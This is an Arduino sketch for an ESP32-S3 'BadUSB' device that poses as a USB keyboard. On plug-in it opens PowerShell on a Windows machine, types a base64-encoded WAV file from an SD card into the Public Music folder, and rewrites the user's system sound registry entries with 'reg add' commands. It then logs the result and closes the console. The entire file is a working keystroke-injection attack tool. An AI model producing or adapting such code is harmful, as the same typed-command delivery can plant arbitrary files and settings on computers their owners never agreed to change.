// ============================================================
// BadUSB Sound Swapper - ESP32-S3 DevKitC-1 N16R8
// SD (SPI: 10/11/12/13) + USB HID Keyboard + Built-in LED GPIO48
// WAV files must be on SD ROOT. TEST MODE: 1 file (bs.wav)
// Target: C:\Users\Public\Music
// ============================================================

#include <USB.h>
#include <USBHIDKeyboard.h>
#include <SPI.h>
#include <SD.h>
#include <mbedtls/base64.h>

// ----------------- USER CONFIG -----------------
#define SD_CS    10
#define SD_SCK   12
#define SD_MOSI  11
#define SD_MISO  13

#define LED_PIN  48

#define BOOT_DELAY_MS   5000
#define WINR_DELAY      3000
#define PS_SETTLE       5000

// ----------------- GLOBALS -----------------
USBHIDKeyboard Keyboard;

struct SoundEvent {
  const char* destName;
  const char* wavFile;
};

// Target Windows Sound Events mapped to payload WAV file
SoundEvent events[] = {
  { "Close Program", "bs.wav" },
  { ".Default",      "bs.wav" },
  { "Maximise",      "bs.wav" },
  { "Minimise",      "bs.wav" },
  { "Open Program",  "bs.wav" }
};
const int NUM_EVENTS = sizeof(events) / sizeof(events[0]);

// ----------------- LED HELPERS (WS2812 @ GPIO48) -----------------
void ledSet(int r, int g, int b) {
  neopixelWrite(LED_PIN, r, g, b);
}
void ledBlue()   { ledSet(0, 0, 60); }
void ledGreen()  { ledSet(0, 60, 0); }
void ledYellow() { ledSet(60, 40, 0); }
void ledRed()    { ledSet(60, 0, 0); }
void ledOff()    { ledSet(0, 0, 0); }

void blinkRed(int times, int d = 200) {
  for (int i = 0; i < times; i++) {
    ledRed(); delay(d); ledOff(); delay(d);
  }
}

// ----------------- TYPE HELPER -----------------
// Chunked typing to prevent OS HID buffer drops and layout mismatches
void typeText(const char* s) {
  const int CHUNK = 12;
  int len = strlen(s);
  for (int i = 0; i < len; i += CHUNK) {
    int n = min(CHUNK, len - i);
    for (int j = 0; j < n; j++) {
      Keyboard.write(s[i + j]);
      delay(2);
    }
    Keyboard.releaseAll();
    delay(20);
  }
}

// ----------------- deployWav -----------------
bool deployWav(const char* wavFile, const char* destName) {
  (void)destName;
  String srcPath = String("/") + wavFile;

  File f = SD.open(srcPath);
  if (!f || f.size() < 100) {
    Serial.print(F("MISSING: "));
    Serial.println(wavFile);
    if (f) f.close();
    return false;
  }
  size_t fileSize = f.size();
  Serial.print(F("FOUND: "));
  Serial.print(wavFile);
  Serial.print(F(" size="));
  Serial.println(fileSize);

  static String b64All;
  b64All = "";
  b64All.reserve((fileSize * 4 / 3) + 16);

  const size_t BUF = 3072;
  static uint8_t buf[BUF];
  static char b64out[5000];

  size_t remaining = fileSize;
  while (remaining > 0) {
    size_t toRead = (remaining > BUF) ? BUF : remaining;
    f.read(buf, toRead);
    size_t outLen = 0;
    mbedtls_base64_encode((unsigned char*)b64out, sizeof(b64out), &outLen, buf, toRead);
    b64All.concat(b64out, (outLen > 0 && b64out[outLen - 1] == '\0') ? outLen - 1 : outLen);
    remaining -= toRead;
  }
  f.close();

  Serial.print(F("B64 len: "));
  Serial.println(b64All.length());

  // Use forward slashes in PowerShell to avoid regional keyboard backslash issues
  String target = "C:/Users/Public/Music/";
  target += wavFile;

  String ps = "$d='";
  ps += b64All;
  ps += "';[IO.File]::WriteAllBytes('";
  ps += target;
  ps += "',[Convert]::FromBase64String($d))";

  ledYellow();
  typeText(ps.c_str());
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2500 + (fileSize / 4096) * 500);

  // ---- Verify file existence on target ----
  String chk = "if ([IO.File]::Exists('";
  chk += target;
  chk += "')) {'OK ";
  chk += wavFile;
  chk += "' | Out-File C:/Users/Public/deploy_check.txt -Append} else {'FAIL ";
  chk += wavFile;
  chk += "' | Out-File C:/Users/Public/deploy_check.txt -Append}";
  typeText(chk.c_str());
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1500);

  Serial.print(F("DEPLOYED: "));
  Serial.println(target);
  return true;
}

// ----------------- registrySet -----------------
void registrySet(const char* destName, const char* wavFile) {
  String target = "C:\\Users\\Public\\Music\\";
  target += wavFile;

  String cmd = "reg add \"HKCU\\AppEvents\\Schemes\\Apps\\.Default\\";
  cmd += destName;
  cmd += "\\.Current\" /ve /t REG_SZ /d \"";
  cmd += target;
  cmd += "\" /f";

  typeText(cmd.c_str());
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
  delay(800);

  Serial.print(F("REG SET: "));
  Serial.println(destName);
}

// ----------------- SETUP -----------------
void setup() {
  Serial.begin(115200);
  delay(200);

  ledBlue();

  // ---- SD init ----
  SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
  if (!SD.begin(SD_CS)) {
    Serial.println(F("SD INIT FAIL"));
    for (;;) { blinkRed(3, 150); delay(2000); }
  }
  Serial.println(F("SD OK"));

  // ---- HID start ----
  Keyboard.begin();
  USB.begin();
  delay(BOOT_DELAY_MS);

  // ---- Open PowerShell via Start Menu search ----
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(1500);

  typeText("powershell");
  delay(800);
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
  delay(PS_SETTLE);

  Serial.println(F("Console open. Starting deploy..."));

  // ---- Deploy loop with Deduplication ----
  int deployed = 0;
  for (int i = 0; i < NUM_EVENTS; i++) {
    Serial.print(F("PROCESSING: "));
    Serial.println(events[i].destName);

    // Check if this WAV file was already deployed in an earlier step
    bool alreadyDeployed = false;
    for (int j = 0; j < i; j++) {
      if (strcmp(events[i].wavFile, events[j].wavFile) == 0) {
        alreadyDeployed = true;
        break;
      }
    }

    bool deploySuccess = false;

    if (alreadyDeployed) {
      deploySuccess = true; 
    } else {
      deploySuccess = deployWav(events[i].wavFile, events[i].destName);
    }

    if (deploySuccess) {
      registrySet(events[i].destName, events[i].wavFile);
      deployed++;
    }
  }

  Serial.print(F("Deployed: "));
  Serial.println(deployed);

  // ---- Self-verify summary ----
  typeText("dir C:/Users/Public/Music >> C:/Users/Public/deploy_check.txt");
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // ---- Close console ----
  typeText("exit");
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();

  // ---- Final LED ----
  if (deployed > 0) {
    ledGreen();
    Serial.println(F("Payload complete"));
  } else {
    ledRed();
    Serial.println(F("NOTHING DEPLOYED"));
  }
}

// ----------------- LOOP -----------------
void loop() {
  delay(1000);
}
